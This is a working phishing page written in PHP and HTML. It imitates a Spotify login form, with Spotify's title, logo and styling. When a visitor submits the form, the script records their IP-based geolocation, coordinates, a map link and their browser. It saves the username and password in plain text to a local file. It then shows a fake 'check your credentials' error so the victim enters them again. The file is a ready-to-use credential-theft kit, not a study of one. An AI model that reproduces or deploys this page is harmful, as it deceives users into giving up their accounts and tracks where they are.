<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {
$data = @unserialize(file_get_contents("http://ip-api.com/php/".$ip));
$ip =$data["query"];
date_default_timezone_set('Europe/Istanbul');


$tarih =" Tarih : ".date('d/m/Y  H:i');
$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
$adress = $Geo_Plugin_XML->geoplugin_request; 
$ulke = $Geo_Plugin_XML->geoplugin_countryName;
$bolge = $Geo_Plugin_XML->geoplugin_region;
$kita = $Geo_Plugin_XML->geoplugin_continentCode;
$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
$sehir = $Geo_Plugin_XML->geoplugin_city;
$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
$enlem = $Geo_Plugin_XML->geoplugin_latitude;
$boylam = $Geo_Plugin_XML->geoplugin_longitude;
$tarayici = $_SERVER['HTTP_USER_AGENT']; 

$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
$yamanefkar["0"] = " Ip Adresi : ".$adress;
$yamanefkar["1"] = " Ulke : ".$ulke; 
$yamanefkar["2"] = " Bolge : ".$bolge;
$yamanefkar["3"] = " Kita : ".$kita;
$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
$yamanefkar["5"] = " Sehir : ".$sehir;
$yamanefkar["6"] = " Plaka : ".$plaka;
$yamanefkar["7"] = " Enlem : ".$enlem;
$yamanefkar["8"] = " Boylam : ".$boylam;
$yamanefkar["9"] = " Google Maps : ".$maps;
$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 


$ac = fopen("kayit.txt","a+");

$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
fwrite($ac,$userlar);
fclose($ac);
sleep(2);

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınız veya Şifrenizi kontrol ediniz!');</script>";
}

 ?>





<!DOCTYPE html>
<html>
<style type="text/css">

body{

  position:absolute;
  width:100%;
  height:100%;
  margin:0;
  padding:0;



    background: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRW7_jqiKGNXw0rwdaS0JKML63-oobfZlMtyfvyExR3aaQV9xWO") no-repeat center center fixed; 
    -webkit-background-size: cover;
    -moz-background-size: cover;
    -o-background-size: cover;
    background-size: cover;
}
h1{
  margin:0 0 .5em 0;
  padding:0;
  color:#fff;
  font-family:helvetica;
  font-size:30px;
  font-weight:100;
  letter-spacing:1px;
  text-align:center;
	text-shadow: 0 1px 2px rgba(0,0,0,1);}
section{
  position:relative;
  top:50%;
  width:300px;
  max-width:96%;
  margin:0 auto;
  padding-top:120px;
	-webkit-transform:translateY(-50%);
	-ms-transform:translateY(-50%);
	transform:translateY(-50%);
  background-image:url(http://www.matthewlewicki.com/codefest/images/spotify-logo-small.png);
  background-position:top center;
  background-repeat:no-repeat;
  background-size:100px;}
form{
  padding:0;
  border-radius: 4px;
  background-color:rgba(255,255,255,.75);
  box-shadow: 0 2px 5px 0px rgba(38,38,38,0.5);}
fieldset{
  display: block;
  width:100%;
	margin:0 auto;
  padding:1em 0 1em 0;
  border: none;
  border-bottom: 1px solid #ccc;}
fieldset:first-child{
  margin-bottom:0;}
fieldset:last-child{
  border-bottom: none;
  margin-top:0;
  padding:0;}
input{
  display:block;
  width: 90%;
  height:20px;
  margin:0 auto;
  padding: 5px 0;
  color: #81b71a;
  border: 1px solid #ccc;
  text-align:center;
  -webkit-border-radius: 4px;
  -moz-border-radius: 4px;
  -o-border-radius: 4px;
  border-radius: 4px;}
input[type="submit"]{
  display: block;
	-webkit-appearance: none;
	-moz-appearance: none;
	width:100%;
  max-width:100% !important;
  height:3em;
	margin: 0 auto;
	padding: 7px 5px 5px 5px;
	background-color:#262626;
	font-family: helvetica, arial, sans-serif;
	font-size: 1em;
	text-transform: uppercase;
	text-align:center;
  color:#81b71a;
	-webkit-border-radius: 4px;
	-moz-border-radius: 4px;
  border:none;
	border-radius: 0 0 4px 4px;
	-webkit-transition: all 0.5s ease-out;
	-moz-transition: all 0.5s ease-out;
	-o-transition: all 0.5s ease-out;
	transition: all 0.5s ease-out;}
input[type="submit"]:hover{
  background-color: #333;
	text-shadow:none;}
input::-webkit-input-placeholder{
	-webkit-transition: all 0.5s ease;
	-moz-transition: all 0.5s ease;
	-o-transition: all 0.5s ease;
	transition: all 0.5s ease;}
input:hover::-webkit-input-placeholder{
  color:#81b71a;}
input:focus::-webkit-input-placeholder{
  opacity:0;}
input[type="text"]:focus,input[type="text"]:active,[type="password"]:focus,input[type="password"]:active{
  outline:0;
 	-webkit-appearance: none;
	-moz-appearance: none; 
  border-image:none;
	-moz-box-shadow: 0 0 20px rgba(129,183,26,0.5);
	box-shadow: 0 0 20px rgba(129,183,26,0.5);
	-webkit-animation: shadow-pulse 3s infinite ease-in-out;}
@-webkit-keyframes shadow-pulse {
  0% {-webkit-box-shadow: 0 0 20px rgba(129,183,26,0);}
  50% {-webkit-box-shadow: 0 0 20px rgba(129,183,26,1);}
  100% {-webkit-box-shadow: 0 0 20px rgba(129,183,26,0);}}
</style>
<head>
		<meta name="author" content="Matthew Lewicki">
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<meta charset="UTF-8">
		<script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
		<title>Spotify Login</title>
	</head>
	<body>
		<section>
       <h1>Welcome to Spotify</h1>
			<form method="post" name="loggin" action="#" id="loggin">
				<fieldset>
					<input id="username" name="login" type="text" placeholder="Username">
				</fieldset>
				<fieldset>
					<input id="password" name="password" type="password" placeholder="Password">
				</fieldset>
				<fieldset>
					<input type="submit" name='submit' value="Sign In" />
				</fieldset>
			</form>
		</section>
	</body>
</html>